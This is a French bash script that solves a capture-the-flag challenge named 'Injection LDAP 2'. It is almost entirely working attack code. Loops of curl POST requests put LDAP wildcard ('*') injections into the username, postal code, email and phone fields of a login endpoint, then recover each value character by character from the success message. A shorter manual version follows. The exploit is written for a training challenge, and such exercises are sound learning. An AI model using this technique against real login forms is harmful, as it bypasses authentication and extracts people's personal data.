#!/bin/bash
#INFORMATIONS SUR SCRIPT
## Nom du script : ldap.sh
## Résumé : Ce script permet de trouver le contenu du flag du CTF "Injection LDAP 2"
##			On nous demande de nous authentifier sur une interface web dont on ne connait pas les credentials, et de récupérer ceux ci.
##			L'interface web nous demmande un "nom d'utilisateur", un "code postal", un "email" ainsi qu'un "numéro de téléphone".
##			Lorsque l'on met un "*" dans chaqu'un des champs, nous sommes autorisés à nous connecter.
##			Tel que "curl -d "username=*&postalCode=*&mail=*&telephoneNumber=*" "http://cft.----/api/ldap/2")" renvoie "Authenfication effectuée avec succès".
## 			Le flag est la concaténation du code postal, de l'email et du numéro de téléphone tel que : Flag{33000-matt@flag.local-0610178954}
## 			
## Commande d'usage : ./ldap.sh
##
## Auteur : Logan
## Date de création du script : 28/11/2025
## Date de création de la version automatisé : 15/12/2025




## Version 2 : Script automatisée -----------------------------------------------

##Variables
lst_chiffres=("0" "1" "2" "3" "4" "5" "6" "7" "8" "9")
lst_lettres=({a..z} "@" ".")
username=""
postalCode=""
mail=""
telephoneNumber=""


#Recherche du Nom d'utilisateur
for i in {1..10}
do
	for i in ${lst_lettres[@]}
	do
		cmd=$(http_proxy= curl -d "username=${username}${i}*&postalCode=*&mail=*&telephoneNumber=*" "http://ctf.----/api/ldap/2")
		if [[ $cmd == "Authenfication effectuée avec succès" ]]
		then 
			username+=$i
			break
		fi
		sleep 1
	done
done


#Recherche du Code postal
for i in {1..5}
do
	for i in ${lst_chiffres[@]}
	do
		cmd=$(http_proxy= curl -d "username=*&postalCode=${postalCode}${i}*&mail=*&telephoneNumber=*" "http://ctf.----/api/ldap/2")
		if [[ $cmd == "Authenfication effectuée avec succès" ]]
		then 
			postalCode+=$i
			break
		fi
		sleep 1
	done
done


#Recherche du mail
for i in {1..25}
do
	for i in ${lst_lettres[@]}
	do
		cmd=$(http_proxy= curl -d "username=*&postalCode=*&mail=${mail}${i}*&telephoneNumber=*" "http://ctf.----/api/ldap/2")
		if [[ $cmd == "Authenfication effectuée avec succès" ]]
		then 
			mail+=$i
			break
		fi
		sleep 1
	done
done


#Recherche du numéro de telephone 
for i in {1..10}
do
	for i in ${lst_chiffres[@]}
	do
		cmd=$(http_proxy= curl -d "username=*&postalCode=*&mail=*&telephoneNumber=${telephoneNumber}${i}*" "http://ctf.----/api/ldap/2")
		if [[ $cmd == "Authenfication effectuée avec succès" ]]
		then 
			telephoneNumber+=$i
			break
		fi
		sleep 1
	done
done


echo "Flag{${postalCode}-${mail}-${telephoneNumber}}"





# Version 1 : non automatisé -------------------------------------



lst=("0" "1" "2" "3" "4" "5" "6" "7" "8" "9")
#lst=({a..z} "@" ".")



for i in ${lst[@]}
do
	cmd=$(http_proxy= curl -d "username=oracle&postalCode=19100&mail=oracle@local&telephoneNumber=0678437689${i}*" "http://ctf.----/api/ldap/2")
	if [[ $cmd == "Authenfication effectuée avec succès" ]]
	then 
		echo $i >> flag.txt
    
        
	fi
	sleep 1
done
cat flag.txt